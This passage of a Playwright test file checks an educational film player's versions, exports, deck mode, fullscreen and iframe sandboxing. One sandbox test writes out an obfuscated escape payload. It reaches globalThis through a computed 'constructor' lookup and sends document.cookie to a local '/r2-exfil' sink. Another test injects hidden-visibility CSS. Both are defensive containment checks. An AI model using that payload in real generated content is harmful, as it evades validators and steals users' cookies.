  await expect(page.locator('.inc-version-picker option').nth(1)).toContainText('v2 (s1b1)');
  expect((await versionsState(page)).current).toBe(2);

  // Back to v1: the old narration plays.
  await page.locator('.inc-version-picker').selectOption('1');
  await expect(page.locator('.inc-version')).toContainText('Version 1');
  await page.evaluate(() => (window.__playground?.model as unknown as { seekBeat(id: string): void }).seekBeat('s1b1'));
  await expect(page.locator('.inc-caption')).toContainText('pendulum hangs');

  // Forward to v2: the new narration, playing.
  await page.locator('.inc-version-picker').selectOption('2');
  await expect(page.locator('.inc-caption')).toContainText('Watch the same moment again');
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { playing: boolean })().playing)).toBe(true);
});

test('stored versions persist across a reload', async ({ page }) => {
  await page.route('**/api/v1/ask/change', (route) => route.fulfill({ json: VERSION_PATCH }));
  await openPlayer(page, 'thirty');
  await makeVersion2(page);
  await page.reload();
  await page.waitForFunction(() => window.__playground?.ready === true);
  await expect(page.locator('.inc-version')).toContainText('Version 2');
  await expect(page.locator('.inc-version-picker option')).toHaveCount(2);
  expect((await versionsState(page)).current).toBe(2);
  await page.evaluate(() => (window.__playground?.model as unknown as { seekBeat(id: string): void }).seekBeat('s1b1'));
  await expect(page.locator('.inc-caption')).toContainText('Watch the same moment again');
});

test('an insert is kept privately and promotes to a shared version', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await seekBeat(page, 2, 0.6);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-ask-chips button').nth(2).click();
  await expect(page.locator('.inc-insert')).toContainText('Explaining deeper', { timeout: 15_000 });
  await expect.poll(async () => (await versionsState(page)).inserts.length).toBe(1);
  expect((await versionsState(page)).inserts[0]).toMatchObject({ beat: 's1b3', version: 1, lines: 2 });
  expect((await versionsState(page)).flatten).toEqual({ film: 6, filmPlus: 8, transcript: 6 });

  // Asker-scoped keys: no asker id in any key.
  const keys = await page.evaluate(() => Object.keys(window.localStorage).filter((name) => name.includes('inserts')));
  expect(keys.length).toBeGreaterThan(0);
  for (const key of keys) expect(key).not.toContain('playground-learner');

  await page.locator('.inc-insert button').click();
  await expect.poll(async () => page.evaluate(() => (window.__playground?.stats as () => { playing: boolean })().playing)).toBe(true);
  await page.locator('.inc-inserts > summary').click();
  await expect(page.locator('.inc-inserts li[data-insert]')).toHaveCount(1);
  await page.locator('.inc-insert-promote').click();
  await expect(page.locator('.inc-version')).toContainText('Version 2', { timeout: 60_000 });
  expect((await versionsState(page)).list[1]!.summary).toBe('v2 (+2 after s1b3)');

  // The promoted beats play with the insert's words.
  await page.evaluate(() => (window.__playground?.model as unknown as { seekBeat(id: string): void }).seekBeat('s1b3-v2-1'));
  await expect(page.locator('.inc-caption')).toContainText('Here is the step again, slowed down.');
});

test('an insert created while Export is open re-syncs the Export selector', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await openMenu(page);
  await page.locator('.inc-export > summary').click();
  await expect(page.locator('.inc-export-select option')).toHaveCount(0);
  await expect(page.locator('.inc-export-insert')).toBeDisabled();

  await seekBeat(page, 2, 0.6);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-ask-chips button').nth(2).click();
  await expect(page.locator('.inc-insert')).toContainText('Explaining deeper', { timeout: 15_000 });
  await expect.poll(async () => (await versionsState(page)).inserts.length).toBe(1);

  // No section toggle: the selector lists the new insert at once.
  await expect(page.locator('.inc-export-select option')).toHaveCount(1);
  await expect(page.locator('.inc-export-insert')).toBeEnabled();
});

test('a refused promotion explains that only the author promotes', async ({ page }) => {
  await page.route('**/api/v1/films/pendulum/promote', (route) => route.fulfill({ status: 404, json: { status: 'failed', reason: 'missing' } }));
  await openPlayer(page, 'thirty');
  await seekBeat(page, 2, 0.6);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-ask-chips button').nth(2).click();
  await expect(page.locator('.inc-insert')).toContainText('Explaining deeper', { timeout: 15_000 });
  await page.locator('.inc-insert button').click();
  await page.locator('.inc-inserts > summary').click();
  await page.locator('.inc-insert-promote').click();
  await expect(page.locator('.inc-inserts-status')).toContainText('Only the film', { timeout: 15_000 });
  await expect(page.locator('.inc-version')).toContainText('Version 1');
});

test('export downloads a transcript of beat text only', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await openMenu(page);
  expect((await versionsState(page)).flatten).toEqual({ film: 6, filmPlus: 6, transcript: 6 });
  await page.locator('.inc-export > summary').click();
  const download = page.waitForEvent('download');
  await page.locator('.inc-export-transcript').click();
  const file = await download;
  expect(file.suggestedFilename()).toBe('pendulum-v1-transcript.txt');
  const text = await readFile(await file.path(), 'utf8');
  expect(text).toBe(
    'A pendulum hangs from its pivot, pulled straight down by gravity.\n' +
      'Pull the bob aside, let go, and watch the swing begin.\n' +
      'It trades height for speed, moving fastest through the very bottom.\n' +
      'Friction steals a little energy on every single passing swing.\n' +
      'A gentle push at just the right moment keeps it swinging.\n' +
      'Every swing takes the same time, so the pendulum keeps time.\n',
  );
});

async function openPlayerExport(page: Page, film: string): Promise<void> {
  await page.request.get('/api/dev/films/clear');
  await page.route('/api/v1/live/token', (route) =>
    route.fulfill({ status: 404, contentType: 'application/json', body: JSON.stringify({}) }),
  );
  await page.goto(`/?page=player&film=${film}&export-debug=1&reduced-motion=0`);
  await page.waitForFunction(() => window.__playground?.ready === true);
}

interface ExportLast {
  readonly url: string;
  readonly width: number;
  readonly height: number;
  readonly fps: number;
  readonly frames: number;
  readonly seconds: number;
  readonly codec: string;
  readonly hasAudio: boolean;
  readonly fallback: boolean;
  readonly speed: number;
}

async function exportLast(page: Page): Promise<ExportLast | null> {
  return page.evaluate(() => (window.__playground?.exportLast as () => ExportLast | null)());
}

async function exportCompare(page: Page, frame: number): Promise<number | null> {
  return page.evaluate((at) => (window.__playground?.exportCompare as (frame: number) => Promise<number | null>)(at), frame);
}

async function runVideoExport(page: Page, selection: string, resolution: string): Promise<void> {
  await openMenu(page);
  await page.locator('.inc-export > summary').click();
  await page.locator('.inc-export-video-selection').selectOption(selection);
  await page.locator('.inc-export-video-resolution').selectOption(resolution);
  await page.locator('.inc-export-video-go').click();
}

test('video export renders the film to MP4 with progress and a download', async ({ page }) => {
  test.setTimeout(240_000);
  await openPlayerExport(page, 'thirty');
  await runVideoExport(page, 'film', '480');
  await expect(page.locator('.inc-export-video-status')).toContainText('Done', { timeout: 180_000 });
  const last = await exportLast(page);
  expect(last).not.toBeNull();
  expect(last!.fallback).toBe(false);
  expect(last!.fps).toBe(30);
  expect(last!.width).toBe(720);
  expect(last!.height).toBe(566);
  expect(last!.frames).toBeGreaterThan(700);
  expect(['H.264', 'VP9', 'VP8']).toContain(last!.codec);
  console.log(`export thirty: ${last!.codec}${last!.hasAudio ? ' + AAC' : ', silent'} ${last!.frames} frames in ${last!.seconds.toFixed(1)} s of film at ${last!.speed.toFixed(1)}x realtime`);
  await expect(page.locator('.inc-export-video-download')).toBeVisible();
  const download = page.waitForEvent('download');
  await page.locator('.inc-export-video-download').click();
  const file = await download;
  expect(file.suggestedFilename()).toBe('pendulum-v1-480p.mp4');
  const path = await file.path();
  expect(path).not.toBeNull();
  const { size } = await stat(path!);
  expect(size).toBeGreaterThan(10_000);
});

test('exported frames match live playback frames at the same timestamps', async ({ page }) => {
  test.setTimeout(240_000);
  await openPlayerExport(page, 'thirty');
  await runVideoExport(page, 'film', '480');
  await expect(page.locator('.inc-export-video-status')).toContainText('Done', { timeout: 180_000 });
  const last = await exportLast(page);
  expect(last).not.toBeNull();
  // Mean absolute channel difference, 0 to 255: the same raster pipeline
  // draws both, so only sub-pixel rounding may differ.
  for (const frame of [0, Math.floor(last!.frames / 2), last!.frames - 1]) {
    const diff = await exportCompare(page, frame);
    expect(diff).not.toBeNull();
    console.log(`export thirty frame ${frame}: mean channel diff ${diff!.toFixed(3)}`);
    expect(diff!).toBeLessThanOrEqual(1);
  }
});

test('the exported MP4 plays back at the film length', async ({ page }) => {
  test.setTimeout(240_000);
  await openPlayerExport(page, 'thirty');
  await runVideoExport(page, 'film', '480');
  await expect(page.locator('.inc-export-video-status')).toContainText('Done', { timeout: 180_000 });
  const last = await exportLast(page);
  expect(last).not.toBeNull();
  const probe = await page.evaluate(async (url) => {
    const video = document.createElement('video');
    video.muted = true;
    video.preload = 'metadata';
    video.src = url;
    await new Promise<void>((resolve, reject) => {
      video.onloadedmetadata = () => resolve();
      video.onerror = () => reject(new Error('the export did not load as video'));
    });
    return { width: video.videoWidth, height: video.videoHeight, duration: video.duration };
  }, last!.url);
  expect(probe.width).toBe(last!.width);
  expect(probe.height).toBe(last!.height);
  expect(probe.duration).toBeCloseTo(last!.seconds, 0);
});

test('video export renders the sixty-second film', async ({ page }) => {
  test.setTimeout(300_000);
  await openPlayerExport(page, 'sixty');
  await runVideoExport(page, 'film', '480');
  await expect(page.locator('.inc-export-video-status')).toContainText('Done', { timeout: 240_000 });
  const last = await exportLast(page);
  expect(last).not.toBeNull();
  expect(last!.fallback).toBe(false);
  expect(last!.frames).toBeGreaterThan(1000);
  console.log(`export sixty: ${last!.codec}${last!.hasAudio ? ' + AAC' : ', silent'} ${last!.frames} frames in ${last!.seconds.toFixed(1)} s of film at ${last!.speed.toFixed(1)}x realtime`);
  const diff = await exportCompare(page, Math.floor(last!.frames / 2));
  expect(diff).not.toBeNull();
  expect(diff!).toBeLessThanOrEqual(1);
});

test('cancelling a video export stops it', async ({ page }) => {
  test.setTimeout(240_000);
  await openPlayerExport(page, 'thirty');
  await runVideoExport(page, 'film', '720');
  await page.locator('.inc-export-video-cancel').click();
  await expect(page.locator('.inc-export-video-status')).toContainText('Cancelled', { timeout: 30_000 });
  await expect(page.locator('.inc-export-video-download')).toBeHidden();
});

test('without WebCodecs the export labels its realtime fallback', async ({ page }) => {
  test.setTimeout(120_000);
  await page.addInitScript(() => {
    const view = window as unknown as Record<string, unknown>;
    delete view.VideoEncoder;
    delete view.AudioEncoder;
  });
  await page.request.get('/api/dev/films/clear');
  await page.goto('/?page=player&film=thirty&reduced-motion=0');
  await page.waitForFunction(() => window.__playground?.ready === true);
  await runVideoExport(page, 'film', '480');
  await expect(page.locator('.inc-export-video-status')).toContainText('fallback', { timeout: 30_000 });
  await page.locator('.inc-export-video-cancel').click();
  await expect(page.locator('.inc-export-video-status')).toContainText('Cancelled', { timeout: 30_000 });
});

async function openPlayerDeck(page: Page, film: string): Promise<void> {
  await page.request.get('/api/dev/films/clear');
  await page.route('/api/v1/live/token', (route) =>
    route.fulfill({ status: 404, contentType: 'application/json', body: JSON.stringify({}) }),
  );
  // The deck ask test asserts the reference model's words ('fastest'), so
  // deck mode pins the reference path like the main opener does.
  await page.goto(`/?page=player&film=${film}&deck=1&reduced-motion=0&export-debug=1&reference=1`);
  await page.waitForFunction(() => window.__playground?.ready === true);
}

interface DeckState {
  readonly advance: string;
  readonly beat: string | null;
  readonly playing: boolean;
  readonly index: number | null;
  readonly total: number;
}

async function deckState(page: Page): Promise<DeckState> {
  return page.evaluate(() => (window.__playground?.deck as () => DeckState)());
}

test('deck mode holds beats until clicked, with next, previous and keys', async ({ page }) => {
  await openPlayerDeck(page, 'thirty');
  await expect(page.locator('.inc-deck-toggle')).toHaveText('Deck: on');
  await expect(page.locator('.inc-deck-position')).toHaveText('—');
  expect((await deckState(page)).advance).toBe('click');
  // Play holds on the first beat instead of running the clock.
  await page.locator('.inc-player-transport button').first().click();
  await expect.poll(async () => (await deckState(page)).beat).toBe('s1b1');
  await page.waitForTimeout(1500);
  expect((await deckState(page)).beat).toBe('s1b1');
  expect((await deckState(page)).playing).toBe(false);
  await expect(page.locator('.inc-deck-position')).toHaveText('Slide 1 of 6');
  await expect(page.locator('.inc-caption')).toContainText('pendulum hangs');
  // Next and previous step paused; the keyboard steps too.
  await page.locator('.inc-deck-next').click();
  await expect.poll(async () => (await deckState(page)).beat).toBe('s1b2');
  await expect(page.locator('.inc-deck-position')).toHaveText('Slide 2 of 6');
  await page.locator('.inc-deck-prev').click();
  await expect.poll(async () => (await deckState(page)).beat).toBe('s1b1');
  await page.locator('.inc-player h2').click();
  await page.keyboard.press('.');
  await expect.poll(async () => (await deckState(page)).beat).toBe('s1b2');
  await page.keyboard.press(',');
  await expect.poll(async () => (await deckState(page)).beat).toBe('s1b1');
  // The toggle leaves deck mode; the film plays as before.
  await openMenu(page);
  await page.locator('.inc-deck-toggle').click();
  await expect(page.locator('.inc-deck-toggle')).toHaveText('Deck: off');
  expect((await deckState(page)).advance).toBe('time');
});

test('deck questions anchor by beat and return to the deck position', async ({ page }) => {
  await openPlayerDeck(page, 'thirty');
  await page.locator('.inc-deck-next').click();
  await page.locator('.inc-deck-next').click();
  await page.locator('.inc-deck-next').click();
  await expect.poll(async () => (await deckState(page)).beat).toBe('s1b3');
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await expect(page.locator('.inc-ask-context')).toContainText('s1b3');
  await page.locator('.inc-ask-input').fill('What hangs it?');
  await page.locator('.inc-ask-chips button').first().click();
  await expect(page.locator('.inc-ask-answer')).toContainText('fastest', { timeout: 15_000 });
  expect((await askState(page)).markers).toBe(1);
  // Show me replays the deck's beat on the live scene.
  await page.locator('.inc-ask-chips button').nth(1).click();
  await expect(page.locator('.inc-showme')).toContainText('Showing s1b3');
  await page.locator('.inc-showme button').click();
  // Explain deeper plays its insert, then returns to the deck position.
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await expect(page.locator('.inc-ask-context')).toContainText('s1b3');
  await page.locator('.inc-ask-input').fill('Tell me more.');
  await page.locator('.inc-ask-chips button').nth(2).click();
  await expect(page.locator('.inc-insert')).toContainText('Explaining deeper', { timeout: 15_000 });
  await page.locator('.inc-insert button').click();
  await expect.poll(async () => (await deckState(page)).beat).toBe('s1b3');
  await expect.poll(async () => (await deckState(page)).playing).toBe(true);
  // The Back-now click scrolled the banner into view; visibility gating
  // freezes the off-screen figure, so scroll back to watch it resume.
  await page.locator('.inc-player-figure').scrollIntoViewIfNeeded();
  // The resumed film plays to the next boundary, then holds for the click.
  await expect.poll(async () => (await deckState(page)).playing, { timeout: 20_000 }).toBe(false);
  await expect.poll(async () => (await deckState(page)).beat).toBe('s1b4');
});

test('deck slide export downloads one still per beat', async ({ page }) => {
  test.setTimeout(240_000);
  await openPlayerDeck(page, 'thirty');
  await openMenu(page);
  await page.locator('.inc-export > summary').click();
  await page.locator('.inc-export-slides-selection').selectOption('film');
  await page.locator('.inc-export-slides-resolution').selectOption('480');
  const download = page.waitForEvent('download');
  await page.locator('.inc-export-slides-go').click();
  const file = await download;
  expect(file.suggestedFilename()).toBe('pendulum-v1-slide-01-s1b1.png');
  await expect(page.locator('.inc-export-slides-status')).toContainText('Done · 6 slides', { timeout: 180_000 });
  const names = await page.evaluate(() => (window.__playground?.slideLast as () => string[] | null)());
  expect(names).toEqual(['pendulum-v1-slide-01-s1b1.png', 'pendulum-v1-slide-02-s1b2.png', 'pendulum-v1-slide-03-s1b3.png', 'pendulum-v1-slide-04-s1b4.png', 'pendulum-v1-slide-05-s1b5.png', 'pendulum-v1-slide-06-s1b6.png']);
  const path = await file.path();
  expect(path).not.toBeNull();
  const { size } = await stat(path!);
  expect(size).toBeGreaterThan(1000);
});

test('deck video export plays the full timed deck', async ({ page }) => {
  test.setTimeout(240_000);
  await openPlayerDeck(page, 'thirty');
  await runVideoExport(page, 'film', '480');
  await expect(page.locator('.inc-export-video-status')).toContainText('Done', { timeout: 180_000 });
  const last = await exportLast(page);
  expect(last).not.toBeNull();
  expect(last!.fallback).toBe(false);
  const film = await page.evaluate(() => {
    const playground = window.__playground as unknown as { film: { seconds: number; beats: Array<{ id: string }> } };
    return { seconds: playground.film.seconds, beats: playground.film.beats.length };
  });
  expect(film.beats).toBe(6);
  // Click advance resolved to timed holds: the MP4 covers the whole film.
  expect(last!.seconds).toBeCloseTo(film.seconds, 1);
  expect(last!.frames).toBe(Math.round(last!.seconds * last!.fps));
});

test('the player opens a generated film from the dev store before fixtures', async ({ page }) => {
  await page.request.get('/api/dev/films/clear');
  const { THIRTY_SECOND_FILM } = await import('@incantly/core');
  const scene = THIRTY_SECOND_FILM.scenes[0]!;
  const saved = await page.request.post('/api/dev/films', {
    data: { id: 'gen-store-1', storyboard: THIRTY_SECOND_FILM.storyboard, scenes: [{ id: scene.id, html: scene.html, css: scene.css, js: scene.js }] },
  });
  expect(saved.ok()).toBe(true);
  await page.goto('/?page=player&film=gen-store-1');
  await page.waitForFunction(() => window.__playground?.ready === true);
  await expect(page.locator('.inc-player h2')).toHaveText('How a pendulum keeps time');
  const scenes = await page.evaluate(() => (window.__playground?.scenes as () => { count: number; multi: boolean })());
  expect(scenes).toMatchObject({ count: 1, multi: false });
});

test('a stored scene with hostile CSS cannot blank the host player', async ({ page }) => {
  await page.request.get('/api/dev/films/clear');
  const { THIRTY_SECOND_FILM } = await import('@incantly/core');
  const scene = THIRTY_SECOND_FILM.scenes[0]!;
  const saved = await page.request.post('/api/dev/films', {
    data: {
      id: 'gen-hostile-css',
      storyboard: THIRTY_SECOND_FILM.storyboard,
      scenes: [{ id: scene.id, html: scene.html, css: `${scene.css}\ndiv { visibility: hidden; }`, js: scene.js }],
    },
  });
  expect(saved.ok()).toBe(true);
  await page.goto('/?page=player&film=gen-hostile-css');
  await page.waitForFunction(() => window.__playground?.ready === true);
  // The figure mounts sandboxed, so its CSS stays inside its own document: the host keeps showing.
  await expect(page.locator('.inc-player-figure iframe')).toHaveCount(1);
  await expect(page.locator('.inc-player-figure svg.inc-stage')).toHaveCount(0);
  await expect(page.locator('.inc-player h2')).toHaveText('How a pendulum keeps time');
  await expect(page.locator('.inc-player h2')).toBeVisible();
  const visibility = await page.locator('.inc-player h2').evaluate((el) => getComputedStyle(el).visibility);
  expect(visibility).toBe('visible');
});

test('a stored scene with a computed-key escape cannot reach the host', async ({ page }) => {
  test.setTimeout(120_000);
  const { createServer } = await import('node:http');
  let sinkHits = 0;
  const sink = createServer((req, res) => {
    sinkHits++;
    res.writeHead(200).end('ok');
  });
  await new Promise<void>((resolve) => sink.listen(0, '127.0.0.1', () => resolve()));
  const sinkPort = (sink.address() as { port: number }).port;
  try {
    await page.request.get('/api/dev/films/clear');
    const { THIRTY_SECOND_FILM } = await import('@incantly/core');
    const scene = THIRTY_SECOND_FILM.scenes[0]!;
    // Validator-silent: computed member access the static checks cannot see.
    const payload = [
      `const fz = (x) => x;`,
      `const Cz = fz['constr' + 'uctor'];`,
      `const Gz = Cz('return globalThis')();`,
      `Gz.document.title = 'PWNED-R2:' + (Gz.document.cookie || 'nocookie');`,
      `Gz['local' + 'Storage']['set' + 'Item']('rereview-sentinel', 'pwned');`,
      `Gz['fe' + 'tch']('http://127.0.0.1:${sinkPort}/r2-exfil?c=' + Gz.document.cookie);`,
    ].join('\n');
    const saved = await page.request.post('/api/dev/films', {
      data: {
        id: 'gen-r2-escape',
        storyboard: THIRTY_SECOND_FILM.storyboard,
        scenes: [{ id: scene.id, html: scene.html, css: scene.css, js: `${scene.js}\n${payload}` }],
      },
    });
    expect(saved.ok()).toBe(true);
    await page.goto('/');
    await page.context().addCookies([{ name: 'r2canary', value: 'secret-token-abc', url: page.url() }]);
    await page.evaluate(() => localStorage.setItem('rereview-sentinel', 'untouched'));
    await page.goto('/?page=player&film=gen-r2-escape');
    await page.waitForFunction(() => window.__playground?.ready === true || document.body.textContent?.includes('could not start') === true, null, { timeout: 30_000 });
    const outcome = await page.evaluate(() => ({
      ready: window.__playground?.ready === true,
      title: document.title,
      sentinel: localStorage.getItem('rereview-sentinel'),
    }));
    // Give a beacon a moment to land, then require full containment: the
    // film either refused to mount or mounted without firing the payload.
    await page.waitForTimeout(1500);
    expect(outcome.title.startsWith('PWNED')).toBe(false);
    expect(outcome.title).not.toContain('secret-token-abc');
    expect(outcome.sentinel).toBe('untouched');
    expect(sinkHits).toBe(0);
  } finally {
    sink.close();
  }
});

test('a generated film plays, seeks and asks through the sandbox', async ({ page }) => {
  await page.request.get('/api/dev/films/clear');
  const { THIRTY_SECOND_FILM } = await import('@incantly/core');
  const scene = THIRTY_SECOND_FILM.scenes[0]!;
  const saved = await page.request.post('/api/dev/films', {
    data: { id: 'gen-play-1', storyboard: THIRTY_SECOND_FILM.storyboard, scenes: [{ id: scene.id, html: scene.html, css: scene.css, js: scene.js }] },
  });
  expect(saved.ok()).toBe(true);
  await page.goto('/?page=player&film=gen-play-1');
  await page.waitForFunction(() => window.__playground?.ready === true);
  // The drawing lives in the sandbox: an iframe, never host markup.
  await expect(page.locator('.inc-player-figure iframe')).toHaveCount(1);
  await expect(page.locator('.inc-player-figure svg.inc-stage')).toHaveCount(0);
  // Play advances the film clock through the stand-ins.
  await page.locator('.inc-player-transport button').first().click();
  await page.waitForFunction(() => {
    const stats = (window.__playground?.stats as () => { time: number })();
    return stats.time > 1;
  });
  await expect(page.locator('.inc-caption')).toContainText('pendulum hangs');
  // Seek lands the beat's state across the bridge.
  await page.evaluate(() => (window.__playground?.model as unknown as { seek(seconds: number): void }).seek(1));
  await expect(page.locator('.inc-caption')).toContainText('pendulum hangs');
  // Ask replays the beat on the stand-in and mirrors it to the figure.
  await seekBeat(page, 2, 0.6);
  await page.getByRole('button', { name: 'Ask about this moment' }).click();
  await page.locator('.inc-ask-chips button').nth(1).click();
  await expect(page.locator('.inc-showme')).toContainText('Showing s1b3');
  await page.locator('.inc-showme button').click();
  await expect(page.locator('.inc-showme')).toBeHidden();
});

test('the dev films store fetches one film by id and lists none', async ({ page }) => {
  await page.request.get('/api/dev/films/clear');
  const { THIRTY_SECOND_FILM } = await import('@incantly/core');
  const scene = THIRTY_SECOND_FILM.scenes[0]!;
  const saved = await page.request.post('/api/dev/films', {
    data: { id: 'gen-no-list', storyboard: THIRTY_SECOND_FILM.storyboard, scenes: [{ id: scene.id, html: scene.html, css: scene.css, js: scene.js }] },
  });
  expect(saved.ok()).toBe(true);
  expect((await page.request.get('/api/dev/films/gen-no-list')).ok()).toBe(true);
  expect((await page.request.get('/api/dev/films')).status()).toBe(404);
});

test('a two-scene generated film mounts all scenes with chapters spanning and cuts rendering', async ({ page }) => {
  await page.request.get('/api/dev/films/clear');
  const { THIRTY_SECOND_FILM, SIXTY_SECOND_FILM } = await import('@incantly/core');
  const first = THIRTY_SECOND_FILM.scenes[0]!;
  const secondFixture = SIXTY_SECOND_FILM.scenes[0]!;
  const secondBeats = SIXTY_SECOND_FILM.storyboard.scenes[0]!.beats.map((beat, index) => ({ ...beat, id: `s2b${index + 1}` }));
  const storyboard = {
    film: { id: 'two', title: 'Two scenes share the player', version: 1, lengthTarget: 120 },
    scenes: [
      { ...THIRTY_SECOND_FILM.storyboard.scenes[0], durationShare: 0.4 },
      { ...SIXTY_SECOND_FILM.storyboard.scenes[0], id: 's2', beats: secondBeats, durationShare: 0.6 },
    ],
  };
  const saved = await page.request.post('/api/dev/films', {
    data: {
      id: 'gen-multi-1',
      storyboard,
      scenes: [
        { id: 's1', html: first.html, css: first.css, js: first.js },
        { id: 's2', html: secondFixture.html, css: secondFixture.css, js: secondFixture.js },
      ],
    },
  });
  expect(saved.ok()).toBe(true);
  await page.goto('/?page=player&film=gen-multi-1');
  await page.waitForFunction(() => window.__playground?.ready === true);
  await expect(page.locator('.inc-player h2')).toHaveText('Two scenes share the player');
  // Both scenes draw sandboxed, with only the active one shown.
  await expect(page.locator('.inc-player-scene iframe')).toHaveCount(2);
  await expect(page.locator('.inc-player-figure svg.inc-stage')).toHaveCount(0);
  await expect(page.locator('.inc-chapters li')).toHaveCount(2);
  const before = await page.evaluate(() => (window.__playground?.scenes as () => { count: number; multi: boolean; active: number; chapters: string[] })());
  expect(before).toMatchObject({ count: 2, multi: true, active: 0, chapters: ['s1', 's2'] });
  await expect(page.locator('.inc-player-scene:not([hidden])')).toHaveCount(1);
  await page.evaluate(() => (window.__playground?.model as unknown as { seekChapter(id: string): void }).seekChapter('s2'));
  const after = await page.evaluate(() => (window.__playground?.scenes as () => { active: number; cuts: Array<{ from: string; to: string }> })());
  expect(after.active).toBe(1);
  expect(after.cuts).toContainEqual({ from: 's1', to: 's2' });
  await expect(page.locator('.inc-player-figure')).toHaveAttribute('data-scene', 's2');
});

test('single-scene films mount exactly as today', async ({ page }) => {
  await openPlayer(page, 'thirty');
  const scenes = await page.evaluate(() => (window.__playground?.scenes as () => { count: number; multi: boolean; active: number; cuts: unknown[] })());
  expect(scenes).toMatchObject({ count: 1, multi: false, active: 0, cuts: [] });
  await expect(page.locator('.inc-player-scene')).toHaveCount(0);
  await expect(page.locator('.inc-chapters li')).toHaveCount(1);
});

interface PlayerBox {
  readonly x: number;
  readonly y: number;
  readonly width: number;
  readonly height: number;
}

async function playerBox(target: Locator): Promise<PlayerBox> {
  const box = await target.boundingBox();
  if (!box) throw new Error('the player target has no box');
  return { x: box.x, y: box.y, width: box.width, height: box.height };
}

async function enterPlayerFullscreen(page: Page): Promise<void> {
  await page.locator('.inc-player-fullscreen').click();
  await page.waitForFunction(() => document.fullscreenElement !== null);
}

async function exitPlayerFullscreen(page: Page): Promise<void> {
  // The toggle is the committable exit path: a synthetic Escape does not
  // leave fullscreen in this harness, while the toggle drives the same
  // fullscreenchange restore a real Esc takes.
  await page.locator('.inc-player-fullscreen').click();
  await page.waitForFunction(() => document.fullscreenElement === null);
}

for (const height of [537, 900]) {
  test(`player fullscreen grows the trusted stage past its windowed box at a ${height} px viewport`, async ({ page }) => {
    await page.setViewportSize({ width: 1280, height });
    await openPlayer(page, 'thirty');
    const stage = page.locator('.inc-player-figure svg.inc-stage').first();
    await expect(stage).toBeVisible();
    const before = await playerBox(stage);
    await enterPlayerFullscreen(page);
    const after = await playerBox(stage);
    expect(after.width, 'fullscreen stage width').toBeGreaterThan(before.width);
    expect(after.height, 'fullscreen stage height').toBeGreaterThan(before.height);
    // Chrome stays usable at the new size: the sound toggle still flips.
    await page.getByRole('button', { name: 'Sound' }).click();
    await expect(page.getByRole('button', { name: 'Sound' })).toHaveText('Sound: on');
    await exitPlayerFullscreen(page);
    expect(await playerBox(stage)).toEqual(before);
  });
}

for (const height of [537, 900]) {
  test(`player fullscreen grows the stored frame past its windowed box at a ${height} px viewport`, async ({ page }) => {
    await page.setViewportSize({ width: 1280, height });
    await page.request.get('/api/dev/films/clear');
    const { THIRTY_SECOND_FILM } = await import('@incantly/core');
    const scene = THIRTY_SECOND_FILM.scenes[0]!;
    const saved = await page.request.post('/api/dev/films', {
      data: { id: 'gen-fullscreen-1', storyboard: THIRTY_SECOND_FILM.storyboard, scenes: [{ id: scene.id, html: scene.html, css: scene.css, js: scene.js }] },
    });
    expect(saved.ok()).toBe(true);
    await page.goto('/?page=player&film=gen-fullscreen-1');
    await page.waitForFunction(() => window.__playground?.ready === true);
    const frame = page.locator('.inc-player-figure iframe').first();
    await expect(frame).toBeVisible();
    const guest = page.frameLocator('.inc-player-figure iframe').locator('svg.inc-stage').first();
    await expect(guest).toBeVisible();
    const before = await playerBox(frame);
    await enterPlayerFullscreen(page);
    // The guest reports its taller box over the resize bridge once the wider frame reflows it.
    await expect.poll(async () => (await playerBox(frame)).height, 'fullscreen frame height').toBeGreaterThan(before.height);
    const after = await playerBox(frame);
    expect(after.width, 'fullscreen frame width').toBeGreaterThan(before.width);
    // The guest never overflows its frame: the drawing sits fully inside it.
    const drawing = await guest.boundingBox();
    expect(drawing).not.toBeNull();
    expect(drawing!.y, 'guest top').toBeGreaterThanOrEqual(after.y - 1);
    expect(drawing!.y + drawing!.height, 'guest bottom').toBeLessThanOrEqual(after.y + after.height + 1);
    await exitPlayerFullscreen(page);
    await expect.poll(async () => playerBox(frame), 'restored frame box').toEqual(before);
  });
}

test('the screen hides figure chrome and keeps captions inside it', async ({ page }) => {
  await openPlayer(page, 'pythagoras');
  // Figure chrome never shows inside the screen in film mode: no title, no
  // idea, no zoom bar, no "change the values" hint.
  await expect(page.locator('.inc-screen .inc-header')).toBeHidden();
  await expect(page.locator('.inc-screen .inc-idea')).toBeHidden();
  await expect(page.locator('.inc-screen .inc-zoombar')).toBeHidden();
  await expect(page.locator('.inc-screen').getByText('Change the values below')).toBeHidden();
  // The sliders live in the Controls strip under the transport, not in the screen.
  await expect(page.locator('.inc-controls .inc-params input[type="range"]')).toHaveCount(2);
  await expect(page.locator('.inc-controls-summary')).toContainText('Controls:');
  // The caption overlays the screen, inside its bounds.
  await page.evaluate(() => (window.__playground?.model as unknown as { seek(seconds: number): void }).seek(1));
  const caption = page.locator('.inc-caption');
  await expect(caption).toContainText('right triangle');
  const screenBox = await page.locator('.inc-screen').boundingBox();
  const captionBox = await caption.boundingBox();
  expect(screenBox).not.toBeNull();
  expect(captionBox).not.toBeNull();
  expect(captionBox!.x, 'caption left').toBeGreaterThanOrEqual(screenBox!.x - 1);
  expect(captionBox!.y, 'caption top').toBeGreaterThanOrEqual(screenBox!.y - 1);
  expect(captionBox!.x + captionBox!.width, 'caption right').toBeLessThanOrEqual(screenBox!.x + screenBox!.width + 1);
  expect(captionBox!.y + captionBox!.height, 'caption bottom').toBeLessThanOrEqual(screenBox!.y + screenBox!.height + 1);
});

test('developer tools stay behind ?debug=1', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await expect(page.locator('.inc-timeline')).toHaveCount(0);
  await expect(page.locator('.inc-player-inspector')).toHaveCount(0);
  await expect(page.locator('.inc-player-badges')).toHaveCount(0);
  await expect(page.locator('.inc-narration')).toHaveCount(0);
});

test('playing never scrolls the page itself', async ({ page }) => {
  await openPlayer(page, 'thirty');
  await page.evaluate(() => window.scrollTo(0, 0));
  await page.locator('.inc-player-transport button').first().click();
  await expect
    .poll(async () => page.evaluate(() => (window.__playground?.stats as () => { playing: boolean })().playing))
    .toBe(true);
